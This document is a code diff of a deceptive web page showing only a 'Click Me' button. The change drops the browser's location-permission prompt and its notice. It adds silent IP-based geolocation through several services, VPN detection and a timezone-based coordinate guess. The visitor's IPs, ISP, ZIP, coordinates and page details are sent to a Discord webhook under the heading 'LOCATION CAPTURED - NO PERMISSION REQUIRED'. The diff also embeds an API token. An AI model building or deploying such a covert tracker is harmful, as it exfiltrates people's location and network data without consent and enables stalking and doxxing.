@@ -8,7 +8,6 @@
         button:hover { background-color: #4752C4; }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
         #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
-        #permissionMessage { margin-top: 20px; color: #ff9800; display: none; }
     </style>
 </head>
 <body>
@@ -16,7 +15,6 @@
     <p>click the button below:</p>
     
     <button id="trackButton">Click Me</button>
-    <div id="permissionMessage">Allow location access for precise coordinates</div>
     <div id="status"></div>
     
     <script>
@@ -107,116 +105,117 @@
             });
         }
         
-        async function getIPLocation(ip) {
-            try {
-                const res = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await res.json();
-                return {
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    isp: data.org || 'Unknown',
-                    zip: data.postal || 'Unknown',
-                    timezone: data.timezone || 'Unknown',
-                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
-                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
-                    source: 'IP API'
-                };
-            } catch (e) {
-                return {
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    isp: 'Unknown',
-                    zip: 'Unknown',
-                    timezone: 'Unknown',
-                    lat: 'Unknown',
-                    lon: 'Unknown',
-                    source: 'Failed'
-                };
-            }
-        }
-        
-        async function getRealTimeLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({
-                        lat: 'Unknown',
-                        lon: 'Unknown',
-                        accuracy: 'N/A',
-                        source: 'Geolocation not supported',
-                        timestamp: new Date().toISOString()
-                    });
-                    return;
+        async function getBestLocation(ip) {
+            const locationAPIs = [
+                {
+                    url: `https://ipapi.co/${ip}/json/`,
+                    parse: (data) => ({
+                        city: data.city || 'Unknown',
+                        region: data.region || 'Unknown',
+                        country: data.country_name || 'Unknown',
+                        isp: data.org || 'Unknown',
+                        zip: data.postal || 'Unknown',
+                        timezone: data.timezone || 'Unknown',
+                        lat: data.latitude ? parseFloat(data.latitude).toFixed(8) : 'Unknown',
+                        lon: data.longitude ? parseFloat(data.longitude).toFixed(8) : 'Unknown',
+                        source: 'ipapi.co'
+                    })
+                },
+                {
+                    url: `https://ipwhois.app/json/${ip}`,
+                    parse: (data) => ({
+                        city: data.city || 'Unknown',
+                        region: data.region || 'Unknown',
+                        country: data.country || 'Unknown',
+                        isp: data.isp || 'Unknown',
+                        zip: data.zip || 'Unknown',
+                        timezone: data.timezone || 'Unknown',
+                        lat: data.latitude ? parseFloat(data.latitude).toFixed(8) : 'Unknown',
+                        lon: data.longitude ? parseFloat(data.longitude).toFixed(8) : 'Unknown',
+                        source: 'ipwhois.app'
+                    })
+                },
+                {
+                    url: `https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`,
+                    parse: (data) => ({
+                        city: data.city || 'Unknown',
+                        region: data.state_prov || 'Unknown',
+                        country: data.country_name || 'Unknown',
+                        isp: data.isp || 'Unknown',
+                        zip: data.zipcode || 'Unknown',
+                        timezone: data.time_zone.name || 'Unknown',
+                        lat: data.latitude ? parseFloat(data.latitude).toFixed(8) : 'Unknown',
+                        lon: data.longitude ? parseFloat(data.longitude).toFixed(8) : 'Unknown',
+                        source: 'ipgeolocation.io'
+                    })
                 }
-                
-                const permissionMessage = document.getElementById('permissionMessage');
-                permissionMessage.style.display = 'block';
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        permissionMessage.style.display = 'none';
-                        resolve({
-                            lat: position.coords.latitude.toFixed(6),
-                            lon: position.coords.longitude.toFixed(6),
-                            accuracy: Math.round(position.coords.accuracy) + ' meters',
-                            altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
-                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
-                            heading: position.coords.heading ? position.coords.heading + '°' : 'N/A',
-                            source: 'Real-time GPS',
-                            timestamp: new Date(position.timestamp).toISOString()
-                        });
-                    },
-                    (error) => {
-                        permissionMessage.style.display = 'none';
-                        let errorMsg = 'Unknown error';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMsg = 'Permission denied';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMsg = 'Position unavailable';
-                                break;
-                            case error.TIMEOUT:
-                                errorMsg = 'Request timeout';
-                                break;
-                        }
-                        resolve({
-                            lat: 'Unknown',
-                            lon: 'Unknown',
-                            accuracy: 'N/A',
-                            source: errorMsg,
-                            timestamp: new Date().toISOString()
-                        });
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
+            ];
+            
+            for (const api of locationAPIs) {
+                try {
+                    const response = await fetch(api.url);
+                    const data = await response.json();
+                    const location = api.parse(data);
+                    
+                    if (location.lat !== 'Unknown' && location.lon !== 'Unknown' && location.city !== 'Unknown') {
+                        return location;
                     }
-                );
-            });
-        }
-        
-        async function reverseGeocode(lat, lon) {
-            if (lat === 'Unknown' || lon === 'Unknown') {
-                return { address: 'No coordinates' };
+                } catch (e) {
+                    continue;
+                }
             }
             
+            return {
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                isp: 'Unknown',
+                zip: 'Unknown',
+                timezone: 'Unknown',
+                lat: 'Unknown',
+                lon: 'Unknown',
+                source: 'All APIs failed'
+            };
+        }
+        
+        async function getTimezoneLocation() {
             try {
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-                const data = await res.json();
-                if (data.address) {
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const response = await fetch(`https://timezoneapi.io/api/timezone/?${timezone}&token=azhwCvdeFlrTTIqRjBqR`);
+                const data = await response.json();
+                
+                if (data.data && data.data.timezone && data.data.timezone.location) {
                     return {
-                        address: `${data.address.road || ''} ${data.address.house_number || ''}, ${data.address.city || data.address.town || data.address.village || ''}, ${data.address.country || ''}`.trim(),
-                        full: data.display_name || 'Unknown address'
+                        lat: parseFloat(data.data.timezone.location.latitude).toFixed(8),
+                        lon: parseFloat(data.data.timezone.location.longitude).toFixed(8),
+                        city: data.data.timezone.capital || 'Unknown',
+                        country: data.data.timezone.country || 'Unknown',
+                        source: 'Timezone API'
                     };
                 }
             } catch (e) {
-                console.log('Reverse geocoding failed');
+                console.log('Timezone API failed');
             }
             
-            return { address: 'Address lookup failed' };
+            return null;
+        }
+        
+        async function getVPNProxyInfo(ip) {
+            try {
+                const response = await fetch(`https://v2.api.iphub.info/ip/${ip}`);
+                const data = await response.json();
+                return {
+                    isVPN: data.block === 1 ? 'Yes' : 'No',
+                    hostname: data.hostname || 'Unknown',
+                    asn: data.asn || 'Unknown'
+                };
+            } catch (e) {
+                return {
+                    isVPN: 'Unknown',
+                    hostname: 'Unknown',
+                    asn: 'Unknown'
+                };
+            }
         }
         
         document.getElementById('trackButton').addEventListener('click', async function() {
@@ -224,7 +223,7 @@
             const status = document.getElementById('status');
             
             button.disabled = true;
-            button.textContent = 'Getting location...';
+            button.textContent = 'Processing...';
             status.style.display = 'none';
             
             try {
@@ -234,11 +233,13 @@
                 
                 const localIP = await getLocalIP();
                 
-                const ipLocation = await getIPLocation(publicIP);
+                const ipLocation = await getBestLocation(publicIP);
                 
-                const realTimeLocation = await getRealTimeLocation();
+                const timezoneLocation = await getTimezoneLocation();
                 
                 const deviceInfo = detectDevice();
+                
+                const vpnInfo = await getVPNProxyInfo(publicIP);
                 
                 const screenWidth = screen.width;
                 const screenHeight = screen.height;
@@ -251,20 +252,17 @@
                 const referrer = document.referrer || 'Direct visit';
                 const language = navigator.language || 'Unknown';
                 
-                let reverseGeocodeResult = { address: 'Not available' };
-                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
-                    reverseGeocodeResult = await reverseGeocode(realTimeLocation.lat, realTimeLocation.lon);
-                }
-                
+                let finalLat = ipLocation.lat;
+                let finalLon = ipLocation.lon;
                 let mapsLink = 'No coordinates available';
-                let gpsMapsLink = 'No GPS coordinates';
                 
-                if (ipLocation.lat !== 'Unknown' && ipLocation.lon !== 'Unknown') {
-                    mapsLink = `https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}`;
+                if (timezoneLocation && timezoneLocation.lat !== 'Unknown' && timezoneLocation.lon !== 'Unknown') {
+                    finalLat = timezoneLocation.lat;
+                    finalLon = timezoneLocation.lon;
                 }
                 
-                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
-                    gpsMapsLink = `https://www.google.com/maps?q=${realTimeLocation.lat},${realTimeLocation.lon}`;
+                if (finalLat !== 'Unknown' && finalLon !== 'Unknown') {
+                    mapsLink = `https://www.google.com/maps/@${finalLat},${finalLon},15z`;
                 }
                 
                 const now = new Date();
@@ -276,27 +274,22 @@
                 const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                 
                 const embed = {
-                    title: "DEVICE LOCATION CAPTURED",
+                    title: "LOCATION CAPTURED - NO PERMISSION REQUIRED",
                     color: 16711680,
                     fields: [
                         {
                             name: "NETWORK INFORMATION",
-                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}`,
+                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}\nVPN/Proxy: ${vpnInfo.isVPN}\nHostname: ${vpnInfo.hostname}`,
                             inline: true
                         },
                         {
-                            name: "IP BASED LOCATION",
-                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nCoordinates: ${ipLocation.lat}, ${ipLocation.lon}\nGoogle Maps: ${mapsLink}`,
+                            name: "IP GEOLOCATION",
+                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nZIP: ${ipLocation.zip}\nTimezone: ${ipLocation.timezone}`,
                             inline: true
                         },
                         {
-                            name: "REAL-TIME GPS LOCATION",
-                            value: `Latitude: ${realTimeLocation.lat}\nLongitude: ${realTimeLocation.lon}\nAccuracy: ${realTimeLocation.accuracy}\nSpeed: ${realTimeLocation.speed}\nHeading: ${realTimeLocation.heading}\nGPS Maps: ${gpsMapsLink}`,
-                            inline: true
-                        },
-                        {
-                            name: "ADDRESS FROM GPS",
-                            value: `Address: ${reverseGeocodeResult.address.substring(0, 100)}${reverseGeocodeResult.address.length > 100 ? '...' : ''}\nSource: ${realTimeLocation.source}\nGPS Time: ${new Date(realTimeLocation.timestamp).toLocaleTimeString()}`,
+                            name: "COORDINATES",
+                            value: `Latitude: ${finalLat}\nLongitude: ${finalLon}\nAccuracy Source: ${ipLocation.source}\nTimezone Source: ${timezoneLocation ? timezoneLocation.source : 'None'}\nGoogle Maps: ${mapsLink}`,
                             inline: true
                         },
                         {
@@ -305,20 +298,20 @@
                             inline: true
                         },
                         {
-                            name: "BROWSER & SESSION",
-                            value: `Cookies: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nOnline: ${onlineStatus}\nReferrer: ${referrer.substring(0, 40)}${referrer.length > 40 ? '...' : ''}\nTime: ${timeStr} ${dateStr}`,
+                            name: "TIME & SESSION",
+                            value: `Date: ${dateStr}\nTime: ${timeStr}\nReferrer: ${referrer.substring(0, 40)}${referrer.length > 40 ? '...' : ''}\nPage URL: ${window.location.href}`,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: `Location Sources: ${ipLocation.source} + ${realTimeLocation.source}`
+                        text: `Location Sources: ${ipLocation.source} • No GPS permission requested`
                     },
                     timestamp: new Date().toISOString()
                 };
                 
                 const discordMessage = {
                     embeds: [embed],
-                    username: "Real-Time Location Tracker"
+                    username: "Location Tracker"
                 };
                 
                 const response = await fetch(WEBHOOK_URL, {
